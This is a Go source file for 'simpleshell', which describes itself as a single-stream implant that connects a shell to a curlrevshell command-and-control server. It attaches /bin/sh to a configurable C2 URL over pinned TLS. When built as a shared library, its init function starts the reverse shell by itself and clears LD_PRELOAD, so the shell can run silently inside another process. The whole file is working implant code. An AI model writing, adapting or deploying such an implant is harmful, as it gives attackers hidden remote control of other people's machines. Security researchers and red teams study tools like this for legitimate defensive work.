// Program simpleshell is a simple client for curlrevshell.
package main

/*
 * simpleshell.go
 * Simple client for curlrevshell
 * By J. Stuart McMurray
 * Created 20241012
 * Last Modified 20241012
 */

import (
	"cmp"
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"runtime/debug"
	"strings"

	"github.com/magisterquis/curlrevshell/lib/simpleshell"
)

// Compile-time defaults
var (
	Args              = ""
	ArgsEnvVar        = "SIMPLESHELL_ARGS"
	C2                = "https://127.0.0.1:4444/io"
	C2EnvVar          = "SIMPLESHELL_C2"
	Fingerprint       string
	FingerprintEnvVar = "SIMPLESHELL_FP"
	IgnoreFlags       string
)

// defaultArgs is what we use if we really don't have any other args.
var defaultArgs = []string{"/bin/sh"}

// ctorBuildMode is the -buildmode value which causes init() to run a shell.
const ctorBuildMode = "c-shared"

func init() {
	/* Figure out if we're in a shared object file.  If so, we'll use
	this constructor function to run our shell. */
	bi, ok := debug.ReadBuildInfo()
	if !ok { /* No way to know if we're a library, so give up :( */
		return
	}
	/* If we seem to be in a library, spawn a shell. */
	for _, s := range bi.Settings {
		if "-buildmode" == s.Key && ctorBuildMode == s.Value {
			os.Unsetenv("LD_PRELOAD")
			go shell(context.Background(), "", "", nil)
			return
		}
	}
}

func main() {
	/* Command-line flags. */
	var (
		c2 = flag.String(
			"c2",
			chooseC2(""),
			"Curlrevshell's `URL`",
		)
		fingerprint = flag.String(
			"fingerprint",
			chooseFingerprint(""),
			"Curlrevshell's TLS `fingerrpint`",
		)
	)
	flag.Usage = func() {
		fmt.Fprintf(
			os.Stderr,
			`Usage: %s [options] [command...]

Simple single-stream implant which connects a command to Curlrevshell.

The command which would be run is

%s

Options:
`,
			filepath.Base(os.Args[0]),
			strings.Join(chooseArgs(flag.Args()), " "),
		)
		flag.PrintDefaults()
	}
	if "" == IgnoreFlags {
		flag.Parse()
	}

	/* This is more or less a library wrapper. */
	if err := shell(
		context.Background(),
		*c2,
		*fingerprint,
		flag.Args(),
	); nil != err {
		log.Printf("Error: %s", err)
	}
}

// chooseArgs works out which set of args to use.  It chooses the first non
// empty slice from its own argument args (which may be nil), the value of the
// environment variable named ArgsEnvVar, Args, and finally defaultArgs.  The
// returned arguments will be split with [simpleshell.SplitArgs] if appropriate.
func chooseArgs(args []string) []string {
	/* Work out how to start a child process. */
	for _, a := range [][]string{
		args,
		simpleshell.SplitArgs(os.Getenv(ArgsEnvVar)),
		simpleshell.SplitArgs(Args),
	} {
		if 0 != len(a) {
			return a
		}
	}
	return defaultArgs
}

// chooseFingerprint works out which fingerprint to use, if any.  It chooses
// the first non-empty string from its own argument, the value of the
// environment variable named FingerprintEnvVar, and finally Fingerprint.
// The returned string may be the empty string.
func chooseFingerprint(fingerprint string) string {
	return cmp.Or(fingerprint, os.Getenv(FingerprintEnvVar), Fingerprint)
}

// chooseC2 works out which C2 address to use, if any.  It chooses the first
// non-empty string from its own argument, the value of the environment
// variable named C2EnvVar, and finally C2.  The returned string may be the
// empty string.
func chooseC2(c2 string) string { return cmp.Or(c2, os.Getenv(C2EnvVar), C2) }

// shell spawns a shell and hooks it up to Curlrevshell.  Any of the non-ctx
// arguments can be their zero values.
func shell(ctx context.Context, c2, fingerprint string, args []string) error {
	return simpleshell.GoSimple(
		ctx,
		chooseC2(c2),
		chooseFingerprint(fingerprint),
		chooseArgs(args),
	)
}
